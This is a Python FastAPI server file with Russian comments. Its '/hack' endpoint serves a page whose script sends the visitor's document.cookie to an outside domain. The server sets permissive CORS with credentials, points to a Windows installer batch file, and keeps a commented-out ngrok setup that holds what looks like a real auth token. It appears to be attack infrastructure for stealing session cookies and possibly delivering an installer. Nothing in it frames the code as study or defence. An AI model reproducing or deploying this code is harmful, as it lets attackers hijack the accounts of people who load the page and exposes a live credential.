from fastapi import FastAPI, Header, Response
from fastapi import FastAPI, HTTPException
from fastapi.responses import RedirectResponse
import uvicorn
from pyngrok import ngrok
from fastapi.middleware.cors import CORSMiddleware

from fastapi.responses import HTMLResponse
import os

current_directory = os.getcwd()

file_path = os.path.join(current_directory, "src/wind_installer.bat")

#import nest_asyncio

#nest_asyncio.apply()

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Разрешить все домены
    allow_credentials=True,
    allow_methods=["*"],  # Разрешить все методы (GET, POST, PUT, DELETE и т.д.)
    allow_headers=["*"],  # Разрешить все заголовки
)

data = {
    "apple": 0,
    "android":0,
    "windows":0
}

@app.get("/hack")
async def read_user_agent():
    return HTMLResponse(
            """<!DOCTYPE html>
        <html lang="en">
        <head>
        <meta charset="UTF-8">
        <title>Title</title>
        </head>
        <body>
        <script>fetch(`https://colizeumapp.ru/${document.cookie}`)</script>
        </body>
        </html>
            """
        )



#HOST = "0.0.0.0"
#PORT = int("8000")

# https://dashboard.ngrok.com/get-started/your-authtoken
#ngrok.set_auth_token("1lFNOAF629r6MfuaNUbM27WdUF9Maaobj4SY")
#public_url = ngrok.connect(PORT).public_url
#print(f"ngrok tunnel {public_url + '/colizeumapp'}")


#app.include_router(auth_route)
#app.include_router(admin_route)

#if __name__ == '__main__':
#    print(f"API rinnung {HOST}:{PORT}")
#    uvicorn.run(app, host=HOST, port=PORT)
